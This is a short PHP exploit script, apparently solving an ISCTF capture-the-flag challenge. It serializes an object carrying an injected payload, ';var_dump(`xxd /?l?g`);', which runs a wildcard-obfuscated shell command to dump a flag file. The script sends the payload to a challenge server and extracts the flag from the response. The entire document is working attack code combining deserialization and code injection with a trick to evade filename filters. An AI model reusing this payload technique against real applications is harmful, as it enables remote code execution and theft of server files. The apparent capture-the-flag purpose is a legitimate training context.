<?php
class FLAG
{
    public $a;
    public $b;
}

$obj = new FLAG();
$obj->a = "FLAG";
$obj->b = ';var_dump(`xxd /?l?g`);';

$serial = serialize($obj);
$encoded = urlencode($serial);

$url = "http://challenge.bluesharkinfo.com:29023/?exp=$encoded";

echo $url . "\n";

file_put_contents('attack_url.txt', $url);

// 尝试访问
echo "\n正在访问...\n";
$ctx = stream_context_create(['http' => ['timeout' => 10]]);
$response = @file_get_contents($url, false, $ctx);

if ($response === false) {
    echo "请求失败或超时\n";
} else {
    echo "\n响应内容:\n";
    echo $response;

    // 尝试提取 flag
    if (preg_match('/ISCTF\{[^}]+\}/', $response, $matches)) {
        echo "\n\n=== FLAG FOUND ===\n";
        echo $matches[0] . "\n";
    }
}
